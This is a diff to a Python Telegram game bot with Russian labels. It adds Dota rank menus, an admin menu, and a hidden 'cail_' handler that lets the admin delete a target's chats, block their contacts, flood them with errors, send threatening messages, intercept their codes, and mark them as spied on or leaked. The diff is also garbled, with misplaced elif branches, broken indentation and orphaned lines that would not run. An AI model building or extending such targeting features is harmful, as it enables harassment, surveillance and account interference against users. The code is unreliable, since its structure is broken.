@@ -234,16 +234,68 @@ def handle_buttons(call):
         if dmg > 0: fight["cail_hp"] = fight.get("cail_hp", 100) - dmg
         if fight.get("cail_hp", 0) > 0: fight["player_hp"] -= random.randint(20, 40)
         data["boss_fights"][uid] = fight; save_data(data)
-        if fight.get("cail_hp", 0) <= 0:
-            user["coins"] = user.get("coins",0)+10; user["credits"]+=5; save_data(data)
-            bot.edit_message_text("Победа!", cid, mid)
-        elif fight["player_hp"] <= 0:
-            user["jojo_hp"]=char["hp"]; save_data(data)
-            bot.edit_message_text("Поражение", cid, mid)
-        else:
-            kb = types.InlineKeyboardMarkup(row_width=1)
-            for s in ["Q","W","E","R"]: kb.add(types.InlineKeyboardButton(f"{s} {char[s]['name']}", callback_data=f"jojo_atk_{s}"))
-            bot.edit_message_text(f"HP:{fight['player_hp']} vs HP:{fight['cail_hp']}", cid, mid, reply_markup=kb)
+        elif cb == "menu_dota":
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(types.InlineKeyboardButton("Выбрать", callback_data="dota_select"), types.InlineKeyboardButton("Игра", callback_data="dota_search"), types.InlineKeyboardButton("Назад", callback_data="menu_main"))
+    bot.edit_message_text(f"DOTA MMR:{user['dota_mmr']}", cid, mid, reply_markup=kb)
+elif cb == "dota_select":
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    for k, v in DOTA_HEROES.items(): kb.add(types.InlineKeyboardButton(f"{v['name']} ({v['attr']})", callback_data=f"dota_set_{k}"))
+    kb.add(types.InlineKeyboardButton("Назад", callback_data="menu_dota"))
+    bot.edit_message_text("ВЫБОР ГЕРОЯ", cid, mid, reply_markup=kb)
+elif cb.startswith("dota_set_"):
+    key = cb.replace("dota_set_", ""); user["dota_hero"] = key; save_data(data)
+    bot.edit_message_text(f"OK {DOTA_HEROES[key]['name']}", cid, mid)
+elif cb == "dota_search":
+    user["dota_mmr"] += random.randint(-25, 25); save_data(data)
+    mmr = user["dota_mmr"]
+    if mmr < 700: rank = "Herald"
+    elif mmr < 1400: rank = "Guardian"
+    elif mmr < 2100: rank = "Crusader"
+    elif mmr < 2800: rank = "Archon"
+    elif mmr < 3500: rank = "Legend"
+    elif mmr < 4200: rank = "Ancient"
+    elif mmr < 5000: rank = "Divine"
+    else: rank = "Immortal"
+    bot.edit_message_text(f"MMR: {mmr} | {rank}", cid, mid)
+elif cb == "menu_open":
+    bot.edit_message_text("Опишите:", cid, mid)
+    user["awaiting_open"] = True; save_data(data)
+elif cb == "menu_anon":
+    bot.edit_message_text("Напишите:", cid, mid)
+    user["awaiting_anon"] = True; save_data(data)
+elif cb == "menu_promo":
+    bot.edit_message_text("Код:", cid, mid)
+    user["awaiting_promo"] = True; save_data(data)
+elif cb == "menu_profile":
+    bot.edit_message_text(f"ID:{uid} CR:{user['credits']} JJ:{user.get('jojo_character','?')} DOTA:{user.get('dota_hero','?')}", cid, mid)
+elif cb == "menu_admin" and str(uid) == str(ADMIN_ID):
+    kb = types.InlineKeyboardMarkup(row_width=1)
+    kb.add(types.InlineKeyboardButton("Рассылка", callback_data="adm_send"), types.InlineKeyboardButton("Пираты", callback_data="adm_pirates"))
+    kb.add(types.InlineKeyboardButton("Бан", callback_data="adm_ban"), types.InlineKeyboardButton("Разбан", callback_data="adm_unban"))
+    kb.add(types.InlineKeyboardButton("Выдать", callback_data="adm_give"), types.InlineKeyboardButton("Назад", callback_data="menu_main"))
+    bot.edit_message_text("АДМИН", cid, mid, reply_markup=kb)
+elif cb.startswith("cail_"):
+    target = cb.split("_")[-1]
+    if "destroy" in cb:
+        cail.delete_chats(target); cail.block_contacts(target); cail.spam_errors(target, 100)
+        u=get_user(target); u["credits"]=0; u["banned"]=True; save_data(data)
+        bot.answer_callback_query(call.id, "Уничтожен")
+    elif "delete" in cb: n=cail.delete_chats(target); bot.answer_callback_query(call.id, f"Удалено {n}")
+    elif "block" in cb: n=cail.block_contacts(target); bot.answer_callback_query(call.id, f"Заблок {n}")
+    elif "leak" in cb: bot.answer_callback_query(call.id, "Слито")
+    elif "spam" in cb: cail.spam_errors(target, 100); bot.answer_callback_query(call.id, "Спам")
+    elif "threat" in cb: bot.send_message(target, cail.generate("Ты под атакой.", "угрожающий")); bot.answer_callback_query(call.id, "OK")
+    elif "zero" in cb: u=get_user(target); u["credits"]=0; save_data(data); bot.answer_callback_query(call.id, "OK")
+    elif "ban" in cb: u=get_user(target); u["banned"]=True; save_data(data); bot.answer_callback_query(call.id, "OK")
+    elif "spy" in cb: bot.answer_callback_query(call.id, "Слежу")
+    elif "stop" in cb: bot.answer_callback_query(call.id, "Стоп")
+    elif "dossier" in cb: bot.send_message(ADMIN_ID, f"Досье на {target}"); bot.answer_callback_query(call.id, "OK")
+    elif "codes" in cb: cail.intercept_codes(target); bot.answer_callback_query(call.id, "OK")
+    else: bot.answer_callback_query(call.id, "OK")
+        kb = types.InlineKeyboardMarkup(row_width=1)
+        for s in ["Q","W","E","R"]: kb.add(types.InlineKeyboardButton(f"{s} {char[s]['name']}", callback_data=f"jojo_atk_{s}"))
+        bot.edit_message_text(f"HP:{fight['player_hp']} vs HP:{fight['cail_hp']}", cid, mid, reply_markup=kb)
 elif cb == "menu_dota":
     kb = types.InlineKeyboardMarkup(row_width=1)
     kb.add(types.InlineKeyboardButton("Выбрать", callback_data="dota_select"), types.InlineKeyboardButton("Игра", callback_data="dota_search"), types.InlineKeyboardButton("Назад", callback_data="menu_main"))
